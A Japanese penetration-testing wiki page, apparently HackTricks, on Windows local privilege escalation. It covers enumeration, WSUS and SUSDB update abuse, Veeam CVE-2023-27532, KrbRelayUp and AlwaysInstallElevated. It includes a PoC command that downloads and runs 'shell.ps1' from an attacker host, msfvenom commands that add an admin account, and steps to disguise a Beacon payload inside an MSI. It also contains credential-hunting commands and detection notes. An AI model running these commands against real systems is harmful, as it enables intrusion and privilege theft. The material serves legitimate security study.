# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors の調査に最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、いくつかの基礎的なガイドにある Windows privilege escalation の一般的な手法をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙手順では、コミュニティのワークショップやチェックリストも参考にしています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 歴史的な攻撃手法の資料には、Windows privilege escalation に関する DerbyCon のプレゼンテーションも含まれています。<sup>[[5]](#references)</sup>

## Windows の基礎理論

### Access Tokens

**Windows access tokens について知らない場合は、続ける前に次のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、次のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels について知らない場合は、続ける前に次のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙**や実行ファイルの起動を**妨げたり**、さらには**活動を検知したり**する要素があります。privilege escalation の列挙を始める前に、次の**ページを読み**、これらの**防御メカニズム**をすべて**列挙してください**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインでの UEFI NVRAM 編集から、起動前の DMA、さらに Windows の `SYSTEM` メモリパッチ適用へとつなげることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess のサイレントな昇格

`RAiLaunchAdminProcess` を通じて起動した UIAccess プロセスは、AppInfo の secure-path チェックを回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection バイパス手順はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop のアクセシビリティレジストリ伝播は、任意の SYSTEM レジストリ書き込み（RegPwn）に悪用できます:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドには、特権を持つローカル NTLM 認証が再利用された SMB TCP 接続上で反射される、**SMB 任意ポート**を利用した LPE 手法も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性がないか確認してください（適用済みのパッチも確認してください）。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### バージョン別 Exploits

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoft のセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が登録されており、Windows環境が提示する**膨大な攻撃対象領域**を示しています。

**システム上で**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OSのビルド、インストール済みの更新プログラム、該当する可能性のあるアドバイザリ候補を一覧表示します。結果を適用可能と判断する前に、正確な製品と後継の更新プログラムを確認してください。

バージョン固有のローカル Exploit を確認する際は、OSのアーキテクチャだけでなく、**実行中のプロセスのアーキテクチャ**も確認してください。64ビット版Windowsでは、32ビットプロセスは[WOW64ファイルシステムリダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)の影響を受けます。通常、`%windir%\System32` は32ビットのシステムディレクトリを指し、`%windir%\Sysnative` を使うと、そのプロセスからネイティブのシステムディレクトリにアクセスできます。このエイリアスは64ビットプロセスでは使用できません。OSのビルドや未適用KBの候補だけでは、Exploit可能であることの証明にはなりません。実行中のビルド、インストール済みまたは後継の更新プログラム、プロセスのアーキテクチャ、Exploitの前提条件を、該当する問題に関する[Microsoftのセキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照合してください。

**システム情報を使ってローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**ExploitのGitHubリポジトリ：**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存された認証情報やJuicy infoはありますか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShellの履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcriptファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で、これを有効にする方法を確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで一例です。[PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) は通常、各ユーザーの Documents フォルダーに出力しますが、`OutputDirectory` 設定や `Start-Transcript -OutputDirectory` によって、共有フォルダーや隠しフォルダーにファイルをリダイレクトできます。transcript を確認する前に、実際の出力先とファイル ACL を確認してください。transcript には、認証情報を含むコマンド引数や出力が記録されている場合があります。閲覧可能な transcript が手掛かりとなるのは、その内容から利用可能な高い権限を持つ ID が判明し、その ID で該当するコンテキストにログオンできる場合に限られます。

### PowerShell Module Logging

PowerShell のパイプライン実行の詳細として、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が記録されます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択します。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell のログから直近 15 件のイベントを表示するには、次を実行します:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行時に、すべてのアクティビティと完全な内容が記録され、コードの各ブロックが実行時に記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジックや悪意ある挙動の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な情報が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のログイベントは、Windows Event Viewer の次の場所で確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
直近の 20 件のイベントを表示するには、次のコマンドを使用します:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP の WSUS エンドポイントは、更新メタデータの傍受を調査する手がかりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者がその通信を傍受または制御できるか、そしてクライアントの更新の信頼設定やインストールポリシーにも左右されます。URL だけではコード実行が可能とは判断できません。[Microsoft は WSUS メタデータに TLS を推奨しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、cmd で次のコマンドを実行し、ネットワークが SSL なしの WSUS 更新を使用しているか確認します。

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または PowerShell で以下を実行します:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような応答が返ってきた場合:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合です。

`UseWUServer` が `1` の場合、Windows Update は設定されたイントラネットサービスを使用します。これは HTTP interception 経路の前提条件を確認するものですが、interception、悪意のある更新プログラムの受け入れ、または昇格した権限でのインストールが可能であることを証明するものではありません。`0` の場合、このポリシーでは該当する設定済み WSUS エンドポイントは選択されません。

この脆弱性を悪用するには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、非 SSL の WSUS トラフィックに「偽の」更新プログラムを挿入する、MiTM 用の weaponized exploit scripts です。

調査資料はこちらです。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**レポート全文はこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的に、このバグが悪用する脆弱性は次のとおりです。

> ローカルユーザーのプロキシを変更でき、Windows Updates が Internet Explorer の設定で構成されたプロキシを使用する場合、PyWSUS をローカルで実行して自分自身のトラフィックを intercept し、アセット上で昇格したユーザーとしてコードを実行できます。
>
> さらに、WSUS サービスは現在のユーザーの設定を使用するため、そのユーザーの証明書ストアも使用します。WSUS ホスト名用の自己署名証明書を生成し、この証明書を現在のユーザーの証明書ストアに追加すれば、HTTP と HTTPS の両方の WSUS トラフィックを intercept できます。WSUS には、証明書に対する trust-on-first-use 型の検証を実装する HSTS のような仕組みはありません。提示された証明書がユーザーによって信頼され、正しいホスト名を持っていれば、サービスによって受け入れられます。

この脆弱性は、ツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（公開された後）を使って悪用できます。

### WSUS 管理者が制御する更新プログラム

現在の ID で WSUS サーバー上の更新プログラムを**公開および承認**できる場合は、別の経路が存在します。サーバーの `WSUS Administrators` グループに対する実効的なメンバーシップと委任された WSUS 権限を確認し、承認済み更新プログラムを受け取るクライアントコンピューターグループを特定してください。[Microsoft は更新プログラムの承認に WSUS Administrator 権限を要求しており](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)、[公開における信頼関係についても説明しています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)。クライアントは、ローカルで公開されたコンテンツの署名に使用される証明書を信頼する必要があります。これを権限昇格経路とみなす前に、対象となる更新プログラムに署名があり、受け入れられること、標的に適用可能であること、より高い権限のコンテキストでインストールされることを確認してください。HTTP の `WUServer` 値やグループ名だけでは、これらの条件が満たされているとは言えません。

### SUSDB のカスタム更新プログラム悪用: `.txt`/`.esd` 経由の未署名ペイロード

これは HTTP WSUS 接続を intercept する方法とは異なる信頼境界の問題です。前提条件は、カスタム更新プログラムを公開および承認するための **WSUS データベース (`SUSDB`) のストアドプロシージャ**に十分なアクセス権があることです。実用的な侵入経路の一つは、上流 WSUS のコンピューターアカウントを、`SUSDB` をホストする別の MSSQL サーバーにリレーする方法です。正確な前提条件は環境によって異なるため、SQL administrator 権限があると決めつけず、まず `EXECUTE` 権限を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

WSUS クライアントの認証を HTTP/8530 から LDAP、SMB、または AD CS にリレーする別の攻撃経路については、[NTLM relay による WSUS HTTP の悪用](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)を参照してください。

#### 更新プログラムの作成、標的指定、承認

カスタム更新プログラムのワークフローでは、制限付きの公開 API として、正規の WSUS プロシージャを使用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| 段階 | 関連するストアドプロシージャ |
| --- | --- |
| 更新プログラムのメタデータをインポート | `spImportUpdate` |
| 前提条件、ローカライズ、拡張 XML フラグメントを保存 | `spSaveXMLFragment` |
| コンテンツのダイジェストを攻撃者が制御する URL に関連付け | `spSetBatchURL` |
| コンピューターグループを列挙/作成し、クライアントを追加 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| そのグループへのインストールを承認 | `@actionID = 0` および `@isAssigned = 1` を指定した `spDeployUpdate` |

ファイル名、ダイジェスト、サイズ、`CommandLineInstallation` handler は、インポートしたメタデータ/フラグメント間で一致している必要があります。コンテンツ URL とターゲットグループを設定した後の最終承認は、次のようになります。例の GUID を再利用せず、新しい更新プログラム、グループ、デプロイメントの識別子を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子による署名バイパス

WSUS は通常、署名のない任意の実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` の .NET `VerifyFile` パスでは、渡されたファイル名が `.txt` または `.esd` で終わる場合、証明書チェックフラグが false に設定されます。これにより、バイト列がテキストまたは正規の ESD イメージであることを事前に確認せずに、`CheckCertificateSignature` がスキップされます。そのため、たとえば `payload.exe.txt` という名前を付けた変更されていない PE がコンテンツ検証を通過し、その後、更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これは署名偽造ではなく、ポリシーと型の混同によるバグです。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate`を呼び出すと、WSUSは登録済みコンテンツを取得します。配信元はBITSのHTTP要件を満たす必要があります。到達可能なURLだけでは不十分で、転送では最初に`HEAD`/`GET`を行い、その後バイト範囲リクエストを使用するためです。Rangeに対応していないサーバーでは、BITSにRangeプロトコルヘッダーが必要であることを示すWSUS同期の`EventId=364`が発生します。<sup>[[39]](#references)</sup>

調査用PoCの[NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)は、import/fragment/URL/group/deploymentチェーンに必要なSQLを生成し、その実行に使う改変版MSSQLクライアントと、コンテンツのステージング用`BitsWebServer.py`を含みます。認可済みラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 無人実行と再試行による永続化

クライアント側の操作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムは、ユーザーが手動で選択しなくても、設定されたスケジュールに従ってダウンロードおよびインストールされます。テストでは、更新が失敗または未完了のままになったペイロードは、コールバックプロセスの終了直後に再び提示されました。そのため、再試行の挙動が繰り返し実行される永続化につながる可能性があります。ただし、クライアントに更新失敗の状態が表示されるため、目立ちます。<sup>[[39]](#references)</sup>

#### 検知とハードニングの着眼点

この一連の攻撃経路で役立つ、サーバー側およびクライアント側の着眼点は次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査します。新しいターゲットグループ、外部コンテンツの配信元、`.txt`/`.esd` の更新ペイロード、および想定外のプリンシパル（特にコンピューターアカウント以外）による展開を調査します。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、および `EventId=364` を確認します。拡張子を信用せず、ペイロードの拡張子とコンテンツのマジックナンバーを照合して検証の記録を確認します。
- Windows Update のインストールが繰り返し失敗・再試行していないか、また `.txt` または `.esd` という名前のコンテンツから PE が実行されたり、予期しない子プロセスやネットワークアクティビティが発生したりしていないかを調査します。
- サポートされている場合は、データベースサービスで Authentication の Extended Protection を必須にし、データベースへのネットワークアクセスを WSUS サーバーおよび許可された管理システムに制限します。カスタム更新手順の `EXECUTE` 権限は最小限に抑え、監査します。

## サードパーティ製 Auto-Updater と Agent IPC (local privesc)

多くのエンタープライズエージェントは、localhost の IPC インターフェースと特権付き更新チャネルを公開しています。登録先を攻撃者のサーバーに強制でき、かつアップデーターが不正なルート CA や弱い署名者チェックを信頼する場合、ローカルユーザーは悪意のある MSI を送り込み、SYSTEM サービスにインストールさせることができます。一般化した手法（Netskope stAgentSvc の一連の攻撃経路 – CVE-2025-0309 に基づく）はこちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 経由の SYSTEM)

Veeam Backup & Replication および Cloud Connect は、デフォルトで **TCP/9401** 上のコアバックアップサービスを使用します。[Veeam のアドバイザリ](https://www.veeam.com/kb4424)では、バックアップネットワークの境界内で、暗号化された構成データベースの認証情報が認証なしで漏えいする問題が説明されています。また、別の公開 PoC では **NT AUTHORITY\SYSTEM** としてコマンドを実行する経路が示されています。<sup>[[12]](#references)</sup> このサービスは localhost 以外にもバインドする場合があるため、実際のアドレスと PID を確認してください。

- **偵察**: TCP/9401 が `Veeam.Backup.Service.exe` に属することを確認し、インストール済み製品とパッチのメタデータを調べます。`netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手掛かりですが、パッチの完全な確認にはなりません。
- **修正済みの最小バージョン**: Veeam は **11a build 11.0.1.1261 P20230227** と **12 build 12.0.0.1420 P20230223** を最初の修正済みリリースとして挙げています。それ以前のリリースは影響を受けます。4つの要素からなるファイルバージョンだけでは、未パッチのベースビルドと、同じビルド番号に後から適用されたパッチを区別できません。境界となるビルドを修正済みと判断する前に、[ベンダーのビルド履歴](https://www.veeam.com/kb2680)でパッチ識別子を確認してください。
- **Exploit**: `VeeamHax.exe` などの PoC と必要な Veeam DLL を同じディレクトリに配置し、ローカルソケット経由で SYSTEM ペイロードを起動します：

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

引用された PoC は、追加の前提条件を満たす場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。
## KrbRelayUp

ローカル Kerberos relay は、適切な COM server が認証を行い、relay された principal が対象オブジェクトへの権限を持つ場合、低い権限のログオンから特権ディレクトリへの書き込みに至る可能性があります。[KrbRelay のドキュメント](https://github.com/cube0x0/KrbRelay)では、RBCD と `msDS-KeyCredentialLink`（shadow-credential）の LDAP 書き込みの両方が説明されており、KrbRelayUp はこれらの経路の一部を自動化します。RBCD の chain には、該当する delegation と対象オブジェクトへの権限が必要です。一方、shadow-credential の chain には、key-credential の書き込み権限と、証明書認証経路をサポートする KDC が必要です。どちらの経路も、ドメインへの参加だけで成立するわけではありません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) と [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) のポリシー、relay される identity のオブジェクト ACL、選択した COM class の認証レベルと impersonation レベルを確認してください。呼び出し元のログオンタイプと認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい認証情報を使ったログオンとは異なる動作をする場合があります。Firewall/OXID のルーティングやインストール済みの更新プログラムも結果に影響する可能性があります。寛容なポリシーや一致する ACL は、レビュー対象として扱ってください。受動的な列挙によって、COM coercion、relay 認証、ディレクトリへの書き込みを実行してはなりません。マシンアカウントの shadow credential からマシンチケットを取得できる場合がありますが、別途 DCSync を行えるのは、そのアカウントが必要なディレクトリレプリケーション権限を持つ場合に限られます。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)にある**exploit を**確認してください。

攻撃の流れについて詳しくは、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>を確認してください。

## AlwaysInstallElevated

この 2 つのレジストリキーが**有効**（値が **0x1**）の場合、どの権限のユーザーでも `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

meterpreter session がある場合は、module **`exploit/windows/local/always_install_elevated`** を使ってこの手法を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使うと、権限昇格用の Windows MSI binary を現在のディレクトリに作成できます。この script は、ユーザーまたはグループの追加を求める precompiled MSI installer を出力します（そのため、GUI access が必要です）。

```
Write-UserAddMSI
```

作成したバイナリを実行して権限を昇格します。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、こちらのチュートリアルを参照してください。**コマンドラインを実行**するだけでよい場合は、「**.bat**」ファイルをラップできます。

{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit を使って、新しい **Windows EXE TCP payload** を `C:\privesc\beacon.exe` に**生成**します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選択して、**Next** をクリックします。
- **AlwaysPrivesc** などのプロジェクト名を付け、場所に **`C:\privesc`** を指定し、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- ステップ 3/4（含めるファイルの選択）に進むまで、**Next** をクリックします。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
  - **Author** や **Manufacturer** など、インストールしたアプリをより正規のものらしく見せるために変更できるプロパティもあります。
- プロジェクトを右クリックして、**View > Custom Actions** を選択します。
- **Install** を右クリックして、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラーの実行と同時に Beacon payload が実行されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**ビルドします**。
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、プラットフォームが x64 に設定されていることを確認してください。

### MSI のインストール

悪意のある `.msi` ファイルの**インストール**をバックグラウンドで実行するには：

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus と検知ツール

### 監査設定

これらの設定は何が**ログに記録される**かを決めるため、注意を払う必要があります。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwardingでは、ログの送信先を把握しておくことが重要です。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** は、コンピューターがドメインに参加している場合に、**ローカル Administrator パスワードを管理**し、各パスワードが**一意でランダムに生成され、定期的に更新される**ように設計されています。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されたユーザーはローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認できます**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** から、Microsoft は Local Security Authority (LSA) の保護を強化し、信頼されていないプロセスによるメモリの**読み取り**やコードの注入を**ブロック**して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威から、デバイスに保存された認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって使用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属しているグループに興味深い権限があるか確認してください。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格できる可能性があります**。特権グループと、それらを悪用して権限昇格する方法については、こちらをご覧ください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### トークン操作

このページで**トークン**とは何かについて**詳しく学びましょう**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
次のページで、**興味深いトークン**とその悪用方法について学びましょう:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン中のユーザー / セッション

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

まず、プロセスを一覧表示し、**プロセスのコマンドラインにパスワードが含まれていないか確認してください**。\
